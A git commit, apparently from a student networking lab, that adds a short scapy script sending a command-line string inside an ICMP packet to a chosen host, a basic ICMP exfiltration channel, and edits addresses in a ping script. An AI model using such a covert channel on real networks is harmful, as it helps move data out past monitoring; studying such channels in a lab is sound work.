322f072c217739e94f0e7e22ee12816f0c3a730c
ninjawill543 <lucas.hanson@ynov.com>
2023-11-27 19:20:30 +0100

    icmp exf send working

---
+++ TP-4/icmp_exf-send.py
@@ -0,0 +1,9 @@
+from scapy.all import IP, ICMP, send
+import sys
+
+
+packet = IP(dst=sys.argv[1])/ICMP()/str(sys.argv[2])
+
+send(packet)
+
+
--- TP-4/ping.py
+++ TP-4/ping.py
@@ -3,9 +3,9 @@ from scapy.all import *
 
 ping = ICMP(type=8)
 
-packet = IP(src="192.168.1.71", dst="192.168.1.254")
+packet = IP(src="192.168.1.71", dst="192.168.1.99")
 
-frame = Ether(src="b0:3c:dc:ae:ab:6e", dst="44:D4:54:7B:E1:4C")
+frame = Ether(src="b0:3c:dc:ae:ab:6e", dst="74:8f:3c:be:6e:b6")
 
 final_frame = frame/packet/ping
 
